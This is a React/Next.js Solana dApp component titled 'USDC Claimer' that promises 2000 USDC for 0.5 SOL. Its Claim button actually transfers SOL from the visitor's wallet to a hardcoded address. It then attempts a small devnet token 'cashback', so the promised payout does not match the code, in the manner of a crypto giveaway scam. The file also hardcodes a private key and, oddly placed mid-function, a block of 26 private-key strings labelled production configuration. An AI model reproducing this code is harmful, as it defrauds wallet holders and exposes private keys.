/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2h9i6PWM49RdiW6fPLYa68jcJjVvZrYHDR3xyABXic8KaNwyVoLMtnZoAyE5p3fVLEwXhH4E5R44GKZHBQaUrGcj"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3J6MgSepxZ1kn6NesbdxjY48V72cnN6sg8qxct8dFGfQqRfTzka9RZhbZtCrJLKdspdjLbP4qXEo9iGYG2MPzenu",
  "key1": "3anGyY3xBU75Z9BpjDLDJhH2Y4ncJmzkBU1Z61fqLMRYXEKv3SskvWwY9w9HEdDLj6Qb9dTfPe7NfTJdZVs3RFQF",
  "key2": "wQB5C4aPCBuZhbWx9aKk1yRvTMdHtEVgprcn3NTzCJMhMnfir4U6UaqYQSbdZNTcmJDGHoPKJsy1BzrDAv3Tie7",
  "key3": "3e92cDoC8ZZUpLwEkJGMZFao5QikugYYxwCwsyyHhKrw3MYXJweR76WSsiTisg8GnrUszjTtYeiUMuz1LRnxUAj8",
  "key4": "2mMQXEKs4x4cWW4yTyADMKZQiYAwgBVMSSsHeo9sCoe4XFyCvjwn5zibtJxsce5qWN9JMWmHgLXwijb8bV1fZwxC",
  "key5": "2Trm9SYCaSLgSx7snvXJoH8qGy8H7BswdyRVLtWisPcX5ogRp1fhoQk7nyGZgTsNrSTqnUYrN7ohxBewBCFtkWSK",
  "key6": "4kAqweJhXqnyhMwM4echmviJRLRvXz89ZTPXVERdRjfTXbJwUqUYPZHwtkyFCYuRrV6syrBsD8SfgsuxjqzKPoGj",
  "key7": "2by33eNGVXwvztL1kAfScF4hkRp1yp8stRY3Rczg9unDvNqpkAeNizggPFUyrdwYpn8fjFZxqrEMEcqQwoF2dQan",
  "key8": "H7LiqBWc3Xt5VQLbubJQ7FVgsHUVUAi1haFCvRha4mjrfC6pcGwViS6fW3yWqWWfenFdv4DGvX266VJpSctdYuX",
  "key9": "K1LbygkEBBcxYfyR7PcauhJ3NDaA75MGw8nWNLmrP9bfwi2g5NByazpstQnJS8aXigc7o6RJ1YSmidK7HS6zacL",
  "key10": "5b724dqxMBHZ8Cx5Me4QYu5gLV2p33KhoRC8MTH1boTCag4C55Pbw5Z1a7uaQ4WPtH5vPCbkxxfiXyXprzStPrJj",
  "key11": "5vCbS3Xw4GvxXR4fuRaxwB81y3ijvxeTMrVv6VtqJY1sftMHtegfFNgFnUEhDEWL4ztVqroeSgHuy5mz8tTFAJxv",
  "key12": "3sfWJGA2Q1uMSUQK8wanzc3rhu2CHDyqefQKo8SsL5wKHneYCHLUNSQiXUBzNkjRRExviPfodiGbnDvsrVJ7CUKN",
  "key13": "3THVAabpWAvujjPyYLgbQLXm1Y3VDZ1J4LLGGWgeFmVSBWEhPwpNMuGxuSppH4DnW2tnZbH2p2rcigNtB2SeWNRg",
  "key14": "3KHGUgjM89QSqK7mJwPByz8G5mwRRG5UowU1xjqcNmryeKRRRBr7NTDsy1K69KN79zLmLVGGvoVaP2skAkL1bRYv",
  "key15": "FBpX7yKwABFm8FnagjmsPHiUfgeVEr8rh2utmfg3kFNhYgv1eFqoe12NLVtLQLnJUr5XNUzJLF3spLDLPeHmdFB",
  "key16": "38R1p53ZMRL88wRbB4A5rBiERkrrjjP3MvkVyRnRKWYrAGqr7ALYzTCmQyMhLAFuVJcN5UjQi8BHVPcNfm3XwCgB",
  "key17": "2HTkRso6TN1uTR3mrxsSo1TbMRiTv6Ueofb9NZzLpNsppdWaWKaiBDpMtod8zuW9Ci4tGxVVFeF1cpeF4ziw7ZPy",
  "key18": "3uy82CmHkMPsF1BDATkkJi9T2gCbS3819tGrK6BxPUyAuqcQJ3vSzEXmJSyvbLVFBS5dGM6N6Y8MVNQY16hJL7BV",
  "key19": "4F7gZkfaVcZMbcGqvzG6PpbWk8aCdULqkmnycEYwXXcsVSJQ2Mc4ix71bqoCXg9EP9CEjzhvzyqPWQyVJvhSYBRo",
  "key20": "45UdAXWtjTdqFsjPzsmHtM1961diJeMpTV33wRknxbk1EV3i6YYckTbeTz1xhgu6bNvPkXteUN7FCHNSXnGQMV7K",
  "key21": "3w7SQAFZmEDPZU6MQfE65CubgdxUkBE5TUbkDSNHsaPcbuU7QarfxcxC5QJnT9RP3rWdwYZMLEJSzSf8eX5wneVr",
  "key22": "qQExVX1izykLm1bapBeVU4FEjqbKU38X6qFrGRpKjBpABCnjBZ8zPDApPQoVrw68yZwDkAJjxZpabZPoSJ5Mkxz",
  "key23": "57PT5tfMFXvgB1jVbZQj2aSr8z4ScUquXRkTQ2n6HC7RaTnNh8x8YKjXCnWmYWzubJKQdrv9ypM6fk4SKmuKxzZP",
  "key24": "5MNPXCTqvuXxsWjus2VqF6uZZ9EMYLCpaJ5e59v9wk2cRSJvvVqta2vwpyZyUHqagbdY4sPLDpuzGGjMCbmXiKGF",
  "key25": "VnU2KbAwKmou8c2eu1qXLq3HNEEMYACemW3iFLRUpfeRQUF3ifdBFVpa71yB3vV68gL6HDNbw1X5ZHJ2Uop1WpW"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
